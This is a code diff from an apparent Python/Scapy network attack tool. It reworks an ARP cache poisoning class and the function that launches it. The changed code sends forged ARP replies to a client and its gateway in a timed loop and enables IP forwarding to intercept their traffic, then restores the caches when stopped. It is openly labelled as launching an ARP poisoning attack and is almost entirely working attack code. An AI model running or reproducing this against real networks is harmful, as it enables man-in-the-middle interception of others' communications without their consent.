@@ -597,12 +597,14 @@ def passiveMonitoring(ip, timeout):
 Define tool for an ARP Cache poisonning
 """
 class ARPCachePoisonning(threading.Thread):
-	def __init__(self, clientMAC, clientIP, gatewayMAC, gatewayIP):
+	def __init__(self, clientIP, gatewayIP):
 		threading.Thread.__init__(self)
-		self.clientMAC = clientMAC
 		self.clientIP = clientIP
-		self.gatewayMAC = gatewayMAC
 		self.gatewayIP = gatewayIP
+
+		self.gatewayMAC = getmacbyip(self.gatewayIP)
+		self.clientMAC = getmacbyip(self.clientIP)
+
 	def run(self):
 		self.sniffARP()
 		
@@ -612,6 +614,7 @@ class ARPCachePoisonning(threading.Thread):
 	def poisonARP(self):
 		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst=self.clientMAC))
 		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst=self.gatewayMAC))
+		
 	def restoreARP(self):
 		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.clientMAC), count=3)
 		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewayMAC), count=3)
@@ -636,26 +639,33 @@ class ARPCachePoisonning(threading.Thread):
 # 		print pkt.show()
 # 		
 # 		send( Ether(dst=self.clientMAC)/ARP(op=2, psrc=self.gatewayIP, pdst=self.clientIP), inter=RandNum(10,40), loop=1, iface=iface )
-	def poison(self):
+	def poison(self, interval = 60):
 		self.enableForwarding();
 		self.running = True
-		while self.running is True:
-			self.poisonARP();
+		try:
+			while self.running is True:
+				self.poisonARP();
+				time.sleep(interval)
+		except KeyboardInterrupt:
+			pass
 		
 		self.restoreARP();
 		self.disableForwarding();
+	
 	def ends(self):
 		self.running = False
 		
 """
 Launch an ARP poisonning attack
 """
-def launchARPpoisonning(clientIP, gatewayIP, timeout):
+def launchARPpoisonning(clientIP, gatewayIP, interval = 60):
 	global verbose, iface
 	
-	arpcachepoison(clientIP, gatewayIP, timeout)
-	arpcachepoison(gatewayIP, clientIP, timeout)
-
+	t = ARPCachePoisonning(clientIP, gatewayIP)
+	t.poison(interval)
+	time.sleep(300)
+	t.join()
+	
 
 def viewPkt(pkt):
 	print pkt.summary()
